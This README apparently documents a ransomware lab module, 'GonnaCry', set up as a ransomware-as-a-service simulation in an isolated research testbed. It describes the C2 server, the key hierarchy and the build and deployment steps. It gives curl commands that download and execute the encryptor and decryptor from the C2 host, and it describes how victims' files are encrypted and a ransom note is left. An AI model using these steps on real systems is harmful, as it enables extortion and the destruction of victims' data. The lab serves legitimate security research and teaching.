# GonnaCry — RaaS Lab Module

GonnaCry is a Linux ransomware ported to Python 3 and integrated into the RansomwareTestbed
as a Ransomware-as-a-Service (RaaS) simulation module.

Crypto: AES-256-GCM per file + RSA-2048 key hierarchy + Flask C2 server.

---

## Architecture

```
Attacker (C2 server: 173.168.0.50)
  ├── server.py          Flask server on port 80
  ├── private_key.key    RSA-2048 server private key (never leaves C2)
  ├── public_key.key     RSA-2048 server public key
  └── binaries/
       ├── gonnacry      Encryptor ELF (served to victims)
       └── decryptor     Decryptor ELF (served after payment)

Victim (client VM: 10.10.20.x)
  └── clicks phishing link → downloads + runs gonnacry binary → files encrypted
```

### Crypto chain

```
Server keypair (RSA-2048)
  server_public_key  → embedded in gonnacry binary at build time
  server_private_key → only on C2 server

Per-victim keypair (RSA-2048)  ← generated fresh at infection
  client_public_key  → encrypts each AES key
  client_private_key → encrypted with server_public_key → stored at ~/gonnacry/

Per-file AES-256-GCM key       ← random per file
```

---

## Prerequisites

C2 server must be running before any attack:

```bash
# From testbed hypervisor
ansible-playbook -i inventory/hosts.ini playbooks/configure_c2.yml -e "project_root=$(pwd)"
```

---

## Attack Simulation

### Phase 1 — Infection (phishing click)

On the victim client, run:

```bash
curl -s http://173.168.0.50/download-gonnacry/ -o /tmp/gonnacry \
  && chmod +x /tmp/gonnacry \
  && /tmp/gonnacry
```

This simulates a victim clicking a malicious link. The binary:
- Generates a unique RSA-2048 keypair for this victim
- Encrypts all files in `~/Documents/`, `~/Desktop/`, etc. with AES-256-GCM
- Encrypts the victim's private key using server's public key
- Saves `~/gonnacry/encrypted_client_private_key.key` and `~/gonnacry/AES_encrypted_keys.txt`
- Drops `~/RANSOM_NOTE.txt` with machine ID and payment instructions
- No network contact during encryption — works fully offline

After infection, victim sees:
```
~/RANSOM_NOTE.txt          ← ransom demand with BTC address + machine ID
~/Documents/*.GNNCRY       ← all files encrypted
~/gonnacry/                ← key material (DO NOT DELETE)
```

### Phase 2 — Ransom (out of scope)

Victim pays. Attacker verifies payment via machine ID in ransom note.

### Phase 3 — Decryption (after payment confirmed)

Attacker delivers decryptor to victim. Victim runs:

```bash
curl -s http://173.168.0.50/download-decryptor/ -o /tmp/decryptor \
  && chmod +x /tmp/decryptor \
  && /tmp/decryptor
```

The binary:
- Reads `~/gonnacry/encrypted_client_private_key.key`
- POSTs it to `http://173.168.0.50/decrypt/` — C2 decrypts with server private key
- Receives victim's RSA private key back
- Uses it to decrypt each AES key from `AES_encrypted_keys.txt`
- Decrypts all `.GNNCRY` files back to originals

---

## Server Keypair Setup (run once)

Generate a fresh RSA-2048 keypair:

```bash
python3 keygen_server.py
```

Paste output into **3 locations**:

| # | File | Key |
|---|------|-----|
| 1 | `src/Server/private_key.key` | Private key (full PEM) |
| 2 | `src/Server/public_key.key` | Public key (full PEM) |
| 3 | `src/GonnaCry/variables.py` — `server_public_key` | Public key in triple-quoted string |

Then rebuild binaries and redeploy C2.

---

## Building Binaries

Run on Ubuntu/Debian (same glibc as client VMs):

```bash
pip3 install pyinstaller pycryptodome requests
./build_binaries.sh
```

Outputs to `src/Server/binaries/`. Commit and redeploy C2:

```bash
git add attacks/GonnaCry/src/Server/binaries/
ansible-playbook -i inventory/hosts.ini playbooks/configure_c2.yml -e "project_root=$(pwd)"
```

---

## Repository Structure

```
GonnaCry/
  src/
    GonnaCry/          Python source (encryptor + decryptor)
      main.py          Encryptor entry point
      decryptor.py     Decryptor entry point
      symmetric.py     AES-256-GCM cipher
      asymmetric.py    RSA-2048 key generation
      variables.py     Paths, server public key
      ...
    Server/            C2 server
      server.py        Flask server (port 80)
      private_key.key  Server RSA private key
      public_key.key   Server RSA public key
      binaries/        Pre-built ELF binaries
  build_binaries.sh    PyInstaller build script (run on Ubuntu)
  keygen_server.py     RSA keypair generator
```

---

## Disclaimer

For academic research and security education only.
Use exclusively within the RansomwareTestbed isolated network.
